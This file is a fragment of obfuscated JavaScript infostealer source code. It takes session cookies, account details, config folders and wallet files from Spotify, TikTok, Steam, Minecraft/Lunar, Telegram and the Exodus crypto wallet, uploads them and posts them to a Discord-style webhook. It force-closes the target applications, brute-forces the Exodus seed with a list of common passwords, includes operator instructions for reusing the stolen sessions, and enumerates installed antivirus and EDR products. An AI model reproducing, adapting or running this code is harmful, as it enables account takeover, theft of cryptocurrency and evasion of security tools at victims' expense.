        console.log('[SPOTIFY] Invalid or expired cookie');
        return;
    }
    const profile = response.data.profile;
    const email = profile.email || 'Not available';
    const country = profile.country || 'Not available';
    const usernameStr = profile.username || 'Username not available';
    const profileUrl = profile.username ? `[Click here](https://open.spotify.com/user/${profile.username})` : 'Username not available';
    let accountData = {};
    try {
        const accountResponse = await axios.get('https://www.spotify.com/at/api/account/v1/datalayer/', {
            headers
        });
        if (accountResponse?.data) {
            accountData = accountResponse.data;
        }
    } catch (err) {
        console.log('[SPOTIFY] Could not fetch account data');
    }
    const currentPlan = accountData.currentPlan || 'Unknown';
    const isRecurring = accountData.isRecurring !== undefined ? accountData.isRecurring : 'Unknown';
    const daysLeft = accountData.daysLeft !== undefined ? accountData.daysLeft : 'Unknown';
    const accountAgeDays = accountData.accountAgeDays !== undefined ? accountData.accountAgeDays : 'Unknown';
    const isSubAccount = accountData.isSubAccount !== undefined ? accountData.isSubAccount : 'Unknown';
    const accountCountry = accountData.country || country;
    const expiry = accountData.expiry || 'Unknown';
    const isPremium = currentPlan && currentPlan !== 'free';
    const fields = [{
        name: 'Cookie:',
        value: `\`\`\`${sp_dc}\`\`\``,
        inline: false
    }, {
        name: 'Profile Url:',
        value: profileUrl,
        inline: true
    }, {
        name: 'Email:',
        value: `\`${email}\``,
        inline: true
    }, {
        name: 'Username:',
        value: `\`${usernameStr}\``,
        inline: true
    }, {
        name: 'Country:',
        value: `\`${accountCountry}\``,
        inline: true
    }];
    if (isPremium) {
        fields.push({
            name: 'Current Plan:',
            value: `\`${currentPlan}\``,
            inline: true
        }, {
            name: 'Recurring:',
            value: `\`${isRecurring}\``,
            inline: true
        }, {
            name: 'Days Left:',
            value: `\`${daysLeft}\``,
            inline: true
        }, {
            name: 'Account Age (Days):',
            value: `\`${accountAgeDays}\``,
            inline: true
        }, {
            name: 'Sub Account:',
            value: `\`${isSubAccount}\``,
            inline: true
        }, {
            name: 'Expiry:',
            value: `\`${expiry}\``,
            inline: true
        });
    }
    const embed = {
        author: {
            name: 'xd (Spotify Session)',
            icon_url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&'
        },
        thumbnail: {
            url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&'
        },
        fields: fields,
        color: 0x2b2d31,
        footer: {
            text: `xd | `
        }
    };
    const payload = {
        username: 'xd',
        avatar_url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&',
        embeds: [embed]
    };
    await xp2q3(payload);
    console.log('[SPOTIFY] Sent:', usernameStr);
}
async function xt2u3() {
    console.log('[*] Starting Steam session collection...');
    try {
        try {
            execSync('taskkill /IM Steam.exe /F', {
                stdio: 'ignore'
            });
        } catch (e) { }
        if (!fs.existsSync("C:\\Program Files (x86)\\Steam\\config")) {
            console.log('[STEAM] Steam config not found');
            return;
        }
        const zipper = new AdmZip();
        zipper.addLocalFolder("C:\\Program Files (x86)\\Steam\\config");
        const temp = os.tmpdir();
        const target = path.join(temp, 'steam_session.zip');
        zipper.writeZip(target);
        const link = await xv8w9(target);
        if (!link) {
            console.log('[STEAM] Failed to upload file');
            fs.unlinkSync(target);
            return;
        }
        if (!fs.existsSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")) {
            console.log('[STEAM] loginusers.vdf not found');
            fs.unlinkSync(target);
            return;
        }
        const accounts = fs.readFileSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf", 'utf-8');
        const ids = accounts.match(/7656[0-9]{13}/g) || [];
        console.log(`[STEAM] Found ${ids.length} Steam accounts`);
        for (const account of ids) {
            try {
                const {
                    data: {
                        response: info
                    }
                } = await axios.get(`https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=${account}`);
                const {
                    data: {
                        response: games
                    }
                } = await axios.get(`https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=${account}`);
                const {
                    data: {
                        response: level
                    }
                } = await axios.get(`https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=${account}`);
                const payload = {
                    content: `\`${info.players[0].personaname}\` - \`${os.hostname()}\``,
                    username: 'xd',
                    avatar_url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&',
                    embeds: [{
                        author: {
                            name: 'xd (Steam Session)',
                            icon_url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&'
                        },
                        description: `🤺 Profile: [Click here to profile!](${info.players[0].profileurl})\n🔍 Download: [Click here to download!](${link})`,
                        fields: [{
                            name: '<:auth:1316345705341911063> Steam Info',
                            value: `> <:mencaoxx:1352260535357280377> **Username**: \`${info.players[0].personaname}\`\n` + `> <:xxxxww:1346711745170771978> **Steam ID**: \`${account}\`\n` + `> <:userrxs:1346717690609406004> **Level**: \`${level.player_level || 'Private'}\`\n` + `> <:badges:1346713638106431519> **Games**: \`${games.game_count || 'Private'}\`\n` + `> <:cxsjjdzx:1346714037630664714> **Created**: <t:${info.players[0].timecreated}:F>`,
                            inline: false
                        }],
                        color: 0x2b2d31,
                        footer: {
                            text: `xd | `
                        },
                        thumbnail: {
                            url: info.players[0].avatarfull
                        }
                    }]
                };
                await xp2q3(payload);
                console.log('[STEAM] Sent webhook for:', info.players[0].personaname);
            } catch (err) {
                console.log('[STEAM] Error processing account:', err.message);
            }
        }
        fs.unlinkSync(target);
    } catch (err) {
        console.log('[STEAM] General error:', err.message);
    }
}
const appdata = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
function xv4w5() {
    const usercache = path.join(appdata, '.minecraft', 'usercache.json');
    let userdata = [];
    if (fs.existsSync(usercache)) {
        try {
            const data = fs.readFileSync(usercache, 'utf-8');
            userdata = JSON.parse(data);
        } catch (e) { }
    }
    return userdata;
}
async function xx6y7_(src, dest) {
    if (!fs.existsSync(src)) {
        return;
    }
    fs.mkdirSync(dest, {
        recursive: true
    });
    const files = fs.readdirSync(src);
    for (const file of files) {
        const srcPath = path.join(src, file);
        const destPath = path.join(dest, file);
        try {
            const stat = fs.statSync(srcPath);
            if (stat.isDirectory()) {
                await copyFolder(srcPath, destPath);
            } else {
                fs.copyFileSync(srcPath, destPath);
            }
        } catch (e) { }
    }
}
async function xz8a9() {
    console.log('[*] Starting Minecraft session collection...');
    try {
        try {
            execSync('taskkill /IM javaw.exe /F', {
                stdio: 'ignore'
            });
        } catch (e) { }
        const home = os.homedir();
        const minecraft = path.join(appdata, '.minecraft');
        const lunar = path.join(home, '.lunarclient');
        const profiles = path.join(minecraft, 'launcher_profiles.json');
        const accounts = path.join(lunar, 'settings', 'game', 'accounts.json');
        const check = [profiles, accounts];
        const files = check.filter(file => fs.existsSync(file));
        if (files.length === 0) {
            console.log('[MINECRAFT] No session files found');
            return;
        }
        console.log(`[MINECRAFT] Found ${files.length} session files`);
        const temp = path.join(os.tmpdir(), `minecraft-${Date.now()}`);
        const tempmine = path.join(temp, 'minecraft');
        fs.mkdirSync(tempmine, {
            recursive: true
        });
        for (const file of files) {
            const destination = path.join(tempmine, path.basename(file));
            fs.mkdirSync(path.dirname(destination), {
                recursive: true
            });
            fs.copyFileSync(file, destination);
        }
        const lunarsettings = path.join(lunar, 'settings');
        const targetsettings = path.join(temp, 'lunarclient', 'settings');
        if (fs.existsSync(lunarsettings)) {
            await copyFolder(lunarsettings, targetsettings);
        }
        const zipper = new AdmZip();
        zipper.addLocalFolder(temp);
        const target = path.join(os.tmpdir(), 'minecraft_session.zip');
        zipper.writeZip(target);
        const link = await xv8w9(target);
        if (!link) {
            console.log('[MINECRAFT] Failed to upload file');
            fs.rmSync(temp, {
                recursive: true,
                force: true
            });
            fs.unlinkSync(target);
            return;
        }
        const user = xv4w5();
        const fields = [{
            name: '<:auth:1316345705341911063> How to Use:',
            value: ">>> Download the file.\nNavigate to your Minecraft or Lunar Client folder.\nReplace the existing files with the ones in the ZIP.",
            inline: false
        }];
        if (user.length > 0) {
            user.forEach(user => {
                const {
                    name,
                    uuid,
                    expiresOn
                } = user;
                let timestamp = null;
                try {
                    timestamp = Math.floor(new Date(expiresOn).getTime() / 1000);
                } catch (e) { }
                let value = `>>> <:mencaoxx:1352260535357280377> **Player:** \`${name}\`\n` + `<:xxxxww:1346711745170771978> **UUID:** \`${uuid}\``;
                if (timestamp) {
                    value += `\n<:cxsjjdzx:1346714037630664714> **Expires:** <t:${timestamp}:F>`;
                }
                value += `\n<:userrxs:1346717690609406004> **Profile:** [Click here to profile!](${`https://namemc.com/search?q=${uuid}`})` + `\n<:badges:1346713638106431519> **Skin:** [Click here to skin!](${`https://mc-heads.net/skin/${uuid}`})`;
                fields.push({
                    name: '<:auth:1316345705341911063> Informations',
                    value: value,
                    inline: false
                });
            });
        }
        const embed = {
            author: {
                name: 'xd (Minecraft Session)',
                icon_url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&'
            },
            description: `🔍 Download: [Click here to download!](${link})`,
            fields: fields,
            color: 0x2b2d31,
            footer: {
                text: `xd | `
            },
            thumbnail: {
                url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&'
            }
        };
        const payload = {
            content: `${os.userInfo().username} - ${os.hostname()}`,
            username: 'xd',
            avatar_url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&',
            embeds: [embed]
        };
        await xp2q3(payload);
        console.log('[MINECRAFT] Session sent to webhook');
        fs.rmSync(temp, {
            recursive: true,
            force: true
        });
        fs.unlinkSync(target);
    } catch (err) {
        console.log('[MINECRAFT] General error:', err.message);
    }
}

function xb0c1(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function xd2e3(src, destZipPath) {
    return new Promise((resolve, reject) => {
        const timeoutId = setTimeout(() => {
            console.log('[TELEGRAM] Zip timeout after 25s');
            reject(new Error('Zip operation timeout'));
        }, 25000);
        const output = fs.createWriteStream(destZipPath);
        const archive = archiver('zip', {
            zlib: {
                level: 5
            }
        });
        output.on('close', () => {
            clearTimeout(timeoutId);
            console.log('[TELEGRAM] ZIP finalized. Size:', archive.pointer(), 'bytes');
            resolve();
        });
        output.on('error', err => {
            clearTimeout(timeoutId);
            console.log('[TELEGRAM] Output stream error:', err.message);
            reject(err);
        });
        archive.on('error', err => {
            clearTimeout(timeoutId);
            console.log('[TELEGRAM] Zip error:', err.message);
            reject(err);
        });
        archive.on('warning', err => {
            if (err.code !== 'ENOENT') {
                console.log('[TELEGRAM] Zip warning:', err.message);
            }
        });
        archive.pipe(output);
        archive.directory(src, 'tdata');
        archive.finalize();
    });
}
async function xf4g5() {
    console.log('[TELEGRAM] Starting Telegram session collection...');
    try {
        console.log('[TELEGRAM] Closing Telegram process...');
        try {
            execSync('taskkill /IM Telegram.exe /F', {
                stdio: 'ignore'
            });
            console.log('[TELEGRAM] Telegram closed');
        } catch {
            console.log('[TELEGRAM] Telegram not running');
        }
        const tdataPath = path.join(appdata, 'Telegram Desktop', 'tdata');
        const zipTarget = path.join(localappdata, 'telegram_session.zip');
        if (!fs.existsSync(tdataPath)) {
            console.log('[TELEGRAM] tdata folder not found');
            return;
        }
        console.log('[TELEGRAM] Compressing tdata folder...');
        try {
            await xd2e3(tdataPath, zipTarget);
        } catch (zipErr) {
            console.log('[TELEGRAM] Compression failed:', zipErr.message);
            if (fs.existsSync(zipTarget)) {
                try {
                    fs.unlinkSync(zipTarget);
                } catch { }
            }
            throw zipErr;
        }
        console.log('[TELEGRAM] Uploading ZIP file...');
        const link = await xv8w9(zipTarget);
        if (!link) {
            console.log('[TELEGRAM] Upload failed');
            fs.unlinkSync(zipTarget);
            return;
        }
        console.log('[TELEGRAM] Upload complete. Link:', link);
        const embed = {
            author: {
                name: 'xd (Telegram Session)',
                icon_url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&'
            },
            description: `Download: [Click here to download!](${link})`,
            color: 0x2b2d31,
            footer: {
                text: `xd | `
            },
            thumbnail: {
                url: 'https://i.pinimg.com/736x/b7/9e/03/b79e039ff0fcce5cbf61708afed57bb2.jpg'
            }
        };
        const payload = {
            username: 'xd',
            avatar_url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&',
            embeds: [embed]
        };
        await xp2q3(payload);
        console.log('[TELEGRAM] Embed sent successfully');
        console.log('[TELEGRAM] Removing temp ZIP...');
        fs.unlinkSync(zipTarget);
        console.log('[TELEGRAM] Cleanup complete');
    } catch (err) {
        console.log('[TELEGRAM] Error:', err.message);
    }
}

const processedCookies = [];
async function xh6i7(secret_cookie) {
    if (processedCookies.includes(secret_cookie)) {
        return;
    }
    processedCookies.push(secret_cookie);
    const headers = {
        accept: 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, compress, deflate, br',
        cookie: `sessionid=${secret_cookie}`
    };
    try {
        const account = await axios.get('https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE', {
            headers
        });
        if (!account?.data?.data?.username) {
            return;
        }
        const insights = await axios.post('https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE', "type_requests=[{'insigh_type':'vv_history','days':16},{'insigh_type':'pv_history','days':16},{'insigh_type':'like_history','days':16},{'insigh_type':'comment_history','days':16},{'insigh_type':'share_history','days':16},{'insigh_type':'user_info'},{'insigh_type':'follower_num_history','days':17},{'insigh_type':'follower_num'},{'insigh_type':'week_new_videos','days':7},{'insigh_type':'week_incr_video_num'},{'insigh_type':'self_rooms','days':28},{'insigh_type':'user_live_cnt_history','days':58},{'insigh_type':'room_info'}]", {
            headers: {
                cookie: `sessionid=${secret_cookie}`
            }
        });
        const wallet = await axios.get('https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true', {
            headers: {
                cookie: `sessionid=${secret_cookie}`
            }
        });
        const payload = {
            username: 'xd',
            avatar_url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&',
            embeds: [{
                author: {
                    name: 'xd (TikTok Session)',
                    icon_url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&'
                },
                fields: [{
                    name: 'Cookie:',
                    value: `\`\`\`${secret_cookie || 'Not found'}\`\`\``,
                    inline: false
                }, {
                    name: 'Profile Url:',
                    value: account.data.data.username ? `[Click here](https://tiktok.com/@${account.data.data.username})` : 'Username not available',
                    inline: true
                }, {
                    name: 'ID:',
                    value: `\`${account.data.data.user_id_str || 'Not available'}\``,
                    inline: true
                }, {
                    name: 'Email:',
                    value: `\`${account.data.data.email || 'None'}\``,
                    inline: true
                }, {
                    name: 'Username:',
                    value: `\`${account.data.data.username || 'Username not available'}\``,
                    inline: true
                }, {
                    name: 'Followers Count:',
                    value: `\`${insights?.data?.follower_num?.value || 'Not available'}\``,
                    inline: true
                }, {
                    name: 'Coins:',
                    value: `\`${wallet?.data?.data?.coins || '0'}\``,
                    inline: true
                }],
                thumbnail: {
                    url: account.data.data.avatar_url
                },
                color: 0x2b2d31,
                footer: {
                    text: `xd | `
                }
            }]
        };
        await xp2q3(payload);
        console.log('[TIKTOK] Sent:', account.data.data.username);
    } catch (err) {
        console.log('[TIKTOK] Error:', err.message);
    }
}

function xj8k9(src, dst) {
    if (!fs.existsSync(dst)) {
        fs.mkdirSync(dst, {
            recursive: true
        });
    }
    const entries = fs.readdirSync(src, {
        withFileTypes: true
    });
    for (const entry of entries) {
        const srcPath = path.join(src, entry.name);
        const dstPath = path.join(dst, entry.name);
        if (entry.isFile()) {
            fs.copyFileSync(srcPath, dstPath);
        } else if (entry.isDirectory()) {
            xj8k9(srcPath, dstPath);
        }
    }
}
function xl0m1(source, out) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(source);
    zipper.writeZip(out);
}
function xn2o3() {
    const passwords = ['', 'password', '123456', '12345678', 'qwerty', 'abc123', 'letmein', 'welcome', 'monkey', 'dragon', 'master', 'sunshine', 'princess', 'football', 'iloveyou', 'admin', 'root'];
    return passwords;
}
function xp4q5(content, password) {
    try {
        const key = crypto.pbkdf2Sync(password, 'exodus', 10000, 32, 'sha512');
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, content.slice(0, 12));
        const authTag = content.slice(-16);
        decipher.setAuthTag(authTag);
        const decrypted = Buffer.concat([decipher.update(content.slice(12, -16)), decipher.final()]);
        return decrypted.toString('utf8');
    } catch (e) {
        return null;
    }
}
async function xr6s7() {
    try {
        console.log('[*] Starting Exodus session collection...');
        exec('taskkill /IM Exodus.exe /F', error => {
        });
        const exodus = path.join(appdata, 'Exodus', 'exodus.wallet');
        const seed = path.join(exodus, 'seed.seco');
        if (!fs.existsSync(seed)) {
            console.log('[EXODUS] No seed file found');
            return;
        }
        console.log('[EXODUS] Exodus wallet found');
        const tempDir = path.join(os.tmpdir(), `exodus-${Date.now()}`);
        fs.mkdirSync(tempDir, {
            recursive: true
        });
        const targetWallet = path.join(tempDir, 'exodus.wallet');
        fs.mkdirSync(targetWallet, {
            recursive: true
        });
        xj8k9(exodus, targetWallet);
        const zipPath = path.join(os.tmpdir(), 'exodus_session.zip');
        xl0m1(tempDir, zipPath);
        console.log('[EXODUS] Created ZIP');
        const content = fs.readFileSync(seed);
        const passwords = xn2o3();
        let found = null;
        let decrypted = null;
        for (let password of passwords) {
            decrypted = xp4q5(content, password);
            if (decrypted) {
                found = password;
                console.log(`[EXODUS] Found password: '${password}'`);
                break;
            }
        }
        const link = await xv8w9(zipPath);
        if (link) {
            let fields = [{
                name: '<:auth:1316345705341911063> How to Use:',
                value: ">>> Download the file.\nNavigate to `%appdata%\\Exodus`.\nReplace the existing `exodus.wallet` folder with the one in the ZIP.\nOpen Exodus and try to access the wallet.",
                inline: false
            }];
            if (found !== null) {
                const pwdDisplay = found === '' ? 'No Password' : found;
                fields.push({
                    name: '<:password:1346711994072612955> Password Found:',
                    value: `>>> 🔑 **Password:** \`${pwdDisplay}\``,
                    inline: false
                });
            } else {
                fields.push({
                    name: '<:password:1346711994072612955> Password:',
                    value: '>>> ⚠️ **Password could not be found** (Wallet may be encrypted with custom password)',
                    inline: false
                });
            }
            const embed = {
                author: {
                    name: 'xd (Exodus Session)',
                    icon_url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&'
                },
                description: `🔍 Download: [Click here to download!](${link})`,
                fields: fields,
                color: 0x2b2d31,
                footer: {
                    text: `xd | `
                },
                thumbnail: {
                    url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&'
                }
            };
            const payload = {
                content: `\`${os.userInfo().username}\` - \`${os.hostname()}\``,
                username: 'xd',
                avatar_url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&',
                embeds: [embed]
            };
            await xp2q3(payload);
            console.log('[EXODUS] Session sent to webhook');
        }
        fs.rmSync(tempDir, {
            recursive: true,
            force: true
        });
        fs.unlinkSync(zipPath);
    } catch (err) {
        console.log('[EXODUS] Error:', err.message);
    }
}

function xt8u9(deepFolder) {
    const wanted = ['output'];
    const found = [];
    const searchPaths = [deepFolder, process.cwd(), path.join(process.cwd(), 'output')];
    for (const searchPath of searchPaths) {
        if (!fs.existsSync(searchPath)) {
            continue;
        }
        try {
            const entries = fs.readdirSync(searchPath, {
                withFileTypes: true
            });
            for (const e of entries) {
                if (!e.isDirectory()) {
                    continue;
                }
                const n = e.name.toLowerCase();
                if (wanted.includes(n)) {
                    const fullPath = path.join(searchPath, e.name);
                    if (!found.includes(fullPath)) {
                        found.push(fullPath);
                    }
                }
            }
        } catch (e) { }
    }
    return found;
}
function xv0w1() {
    const detected = [];
    const avPaths = ["C:\\Program Files\\Avast Software", "C:\\Program Files\\McAfee", "C:\\Program Files\\Norton", "C:\\Program Files\\Kaspersky Lab", "C:\\Program Files\\BitDefender", "C:\\Program Files\\ESET", "C:\\Program Files\\AVG", "C:\\Program Files\\Malwarebytes", "C:\\Program Files\\Sophos", "C:\\Program Files (x86)\\Avast Software", "C:\\Program Files (x86)\\McAfee", "C:\\Program Files (x86)\\Norton", "C:\\Program Files (x86)\\Kaspersky Lab", "C:\\Program Files (x86)\\BitDefender", "C:\\Program Files (x86)\\ESET", "C:\\Program Files (x86)\\AVG", "C:\\Program Files (x86)\\Malwarebytes", "C:\\Program Files (x86)\\Sophos"];
    for (const p of avPaths) {
        if (fs.existsSync(p)) {
            detected.push(p);
        }
    }
    return detected;
}
async function xd0e1() {
    const detected = [];
    const avPaths = ["C:\\Program Files\\Avast Software", "C:\\Program Files\\McAfee", "C:\\Program Files\\Norton", "C:\\Program Files\\Kaspersky Lab", "C:\\Program Files\\BitDefender", "C:\\Program Files\\ESET", "C:\\Program Files\\AVG", "C:\\Program Files\\Malwarebytes", "C:\\Program Files\\Sophos", "C:\\Program Files (x86)\\Avast Software", "C:\\Program Files (x86)\\McAfee", "C:\\Program Files (x86)\\Norton", "C:\\Program Files (x86)\\Kaspersky Lab", "C:\\Program Files (x86)\\BitDefender", "C:\\Program Files (x86)\\ESET", "C:\\Program Files (x86)\\AVG", "C:\\Program Files (x86)\\Malwarebytes", "C:\\Program Files (x86)\\Sophos"];
    for (const p of avPaths) {
        if (fs.existsSync(p)) {
            const avName = p.includes('Avast') ? 'Avast' : p.includes('McAfee') ? 'McAfee' : p.includes('Norton') ? 'Norton' : p.includes('Kaspersky') ? 'Kaspersky' : p.includes('BitDefender') ? 'BitDefender' : p.includes('ESET') ? 'ESET' : p.includes('AVG') ? 'AVG' : p.includes('Malwarebytes') ? 'Malwarebytes' : p.includes('Sophos') ? 'Sophos' : 'Unknown AV';
            detected.push(avName);
        }
    }
    const avList = [{
        name: 'Avast',
        processes: ['AvastSvc.exe', 'AvastUI.exe', 'avast.exe', 'aswEngSrv.exe', 'aswToolsSvc.exe']
    }, {
        name: 'McAfee',
        processes: ['McAfeeTray.exe', 'McAfeeUI.exe', 'mcafee.exe', 'mcshield.exe', 'mfeann.exe', 'mfemms.exe', 'mfetp.exe']
    }, {
        name: 'Norton',
        processes: ['NortonSecurity.exe', 'Norton.exe', 'norton.exe', 'ccSvcHst.exe', 'ccSvcHst.exe']
    }, {
        name: 'Kaspersky',
        processes: ['Kaspersky.exe', 'ksde.exe', 'kav.exe', 'avp.exe', 'klnagent.exe', 'kavfssvc.exe']
    }, {
        name: 'BitDefender',
        processes: ['BitDefender.exe', 'bdagent.exe', 'bdwtxag.exe', 'vsserv.exe', 'bdredline.exe']
    }, {
        name: 'Windows Defender',
        processes: ['MsMpEng.exe', 'SecurityHealthService.exe', 'MsSense.exe', 'SenseCncProxy.exe']
    }, {
        name: 'ESET',
        processes: ['ekrn.exe', 'egui.exe', 'esets_svc.exe', 'esets_gui.exe']
    }, {
        name: 'AVG',
        processes: ['AVG.exe', 'avgui.exe', 'avgsvc.exe', 'avgwdsvc.exe', 'avgidsagent.exe']
    }, {
        name: 'Malwarebytes',
        processes: ['MBAMService.exe', 'MBAMTray.exe', 'MBAMScheduler.exe', 'mbam.exe']
    }, {
        name: 'Sophos',
        processes: ['SophosUI.exe', 'SophosAV.exe', 'SophosED.exe', 'SophosFS.exe', 'SophosHealth.exe']
    }, {
        name: 'Trend Micro',
        processes: ['tmntsrv.exe', 'tmproxy.exe', 'tmlisten.exe', 'PccNTMon.exe', 'Ntrtscan.exe']
    }, {
        name: 'Priv',
        processes: ['PSUAService.exe', 'PavFnSvr.exe', 'PavPrSrv.exe', 'Priv_URL_Filtering.exe']
    }, {
        name: 'Avira',
        processes: ['avguard.exe', 'avgnt.exe', 'avshadow.exe', 'Avira.ServiceHost.exe']
    }, {
        name: 'Comodo',
        processes: ['cmdagent.exe', 'cis.exe', 'CisTray.exe', 'cfp.exe']
    }, {
        name: 'F-Secure',
        processes: ['fsaua.exe', 'fsav.exe', 'fshoster32.exe', 'fsorsp.exe']
    }, {
        name: 'ZoneAlarm',
        processes: ['zlclient.exe', 'vsmon.exe', 'ZoneAlarm.exe']
    }, {
        name: 'Webroot',
        processes: ['WRSA.exe', 'WRSVC.exe', 'WRCoreService.exe']
    }, {
        name: 'BullGuard',
        processes: ['BullGuardAV.exe', 'BullGuardTray.exe', 'BullGuardScanner.exe']
    }, {
        name: 'VIPRE',
        processes: ['SBAMSvc.exe', 'VIPREUI.exe', 'SBAMTray.exe']
    }, {
        name: 'G Data',
        processes: ['AVK.exe', 'GDScan.exe', 'AVKTray.exe']
    }, {
        name: 'Emsisoft',
        processes: ['a2service.exe', 'a2guard.exe', 'a2start.exe']
    }, {
        name: 'IObit',
        processes: ['IMFsrv.exe', 'ASC.exe', 'HipsDaemon.exe']
    }, {
        name: '360 Total Security',
        processes: ['360Tray.exe', '360sd.exe', '360rp.exe', 'ZhuDongFangYu.exe']
    }, {
        name: 'Qihoo 360',
        processes: ['360Safe.exe', 'ZhuDongFangYu.exe', '360Tray.exe']
    }, {
        name: 'Tencent',
        processes: ['QQPCMgr.exe', 'QQPCTray.exe', 'QQPCRTP.exe']
    }, {
        name: 'Baidu',
        processes: ['BaiduSdSvc.exe', 'BaiduSdTray.exe', 'BaiduSd.exe']
    }, {
        name: 'Rising',
        processes: ['RsMgrSvc.exe', 'RsTray.exe', 'Rising.exe']
    }, {
        name: 'Kingsoft',
        processes: ['KAVStart.exe', 'KSWebShield.exe', 'kwsprotect64.exe']
    }, {
        name: 'Jiangmin',
        processes: ['KVMonXP.exe', 'KVXP.exe', 'KVFW.exe']
    }, {
        name: 'Dr.Web',
        processes: ['dwengine.exe', 'dwarkdaemon.exe', 'dwscanner.exe']
    }, {
        name: 'Bkav',
        processes: ['BkavService.exe', 'BkavTray.exe', 'BkavPro.exe']
    }, {
        name: 'ClamAV',
        processes: ['clamd.exe', 'freshclam.exe', 'clamscan.exe']
    }, {
        name: 'Fortinet',
        processes: ['FortiTray.exe', 'FortiClient.exe', 'FortiESNAC.exe']
    }, {
        name: 'Check Point',
        processes: ['cpda.exe', 'cpep.exe', 'cpoca.exe']
    }, {
        name: 'Cisco',
        processes: ['csc.exe', 'csagent.exe', 'ciscoamp.exe']
    }, {
        name: 'Symantec',
        processes: ['smc.exe', 'smcgui.exe', 'rtvscan.exe', 'ccSvcHst.exe']
    }, {
        name: 'CrowdStrike',
        processes: ['CSFalconService.exe', 'CSFalcon.exe', 'CSFalconContainer.exe']
    }, {
        name: 'SentinelOne',
        processes: ['SentinelAgent.exe', 'SentinelUI.exe', 'SentinelServiceHost.exe']
    }, {
        name: 'Carbon Black',
        processes: ['cb.exe', 'cbcomms.exe', 'RepMgr.exe', 'RepUtils.exe']
    }, {
